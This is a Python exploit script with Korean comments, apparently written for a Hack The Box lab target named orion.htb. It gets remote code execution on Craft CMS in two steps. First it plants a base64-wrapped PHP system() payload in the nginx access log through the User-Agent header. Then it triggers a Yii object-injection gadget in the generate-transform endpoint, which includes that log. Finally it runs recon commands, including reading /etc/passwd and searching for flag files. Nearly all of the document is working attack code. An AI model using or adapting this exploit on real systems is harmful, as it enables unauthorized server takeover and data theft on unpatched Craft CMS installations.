#!/usr/bin/env python3
"""빠른 RCE 명령 실행 - base64로 인코딩된 명령들"""
import socket, sys, re, json, base64
import requests, urllib3

urllib3.disable_warnings()
TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig(TARGET_IP if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

TARGET = "http://orion.htb"
s = requests.Session()
s.verify = False

def rce(cmd):
    csrf_r = s.get(f"{TARGET}/actions/users/session-info", headers={"Accept": "application/json"})
    csrf = csrf_r.json()["csrfTokenValue"]

    # Base64로 명령 인코딩
    cmd_b64 = base64.b64encode(cmd.encode()).decode()
    php = f"<?php echo 'START:'; system(base64_decode('{cmd_b64}')); echo ':END'; exit; ?>"

    s.get(f"{TARGET}/", headers={"User-Agent": php})

    payload = {
        "assetId": 2,
        "handle": {
            "width": 1, "height": 1,
            "as hack": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [{"itemFile": "/var/log/nginx/access.log"}],
            },
        },
    }
    r = s.post(f"{TARGET}/actions/assets/generate-transform",
               data=json.dumps(payload),
               headers={"Content-Type": "application/json", "X-CSRF-Token": csrf})

    m = re.search(r"START:(.*?):END", r.text, re.DOTALL)
    return m.group(1).strip() if m else None

if __name__ == "__main__":
    cmds = [
        "whoami",
        "pwd",
        "ls -la /home",
        "cat /etc/passwd | head -20",
        "find /home -name flag* 2>/dev/null",
        "find / -name '*flag*' -type f 2>/dev/null | head -20",
    ]

    for cmd in cmds:
        print(f"\n[*] Running: {cmd}")
        out = rce(cmd)
        if out:
            print(out[:1000])
        else:
            print("(no output)")
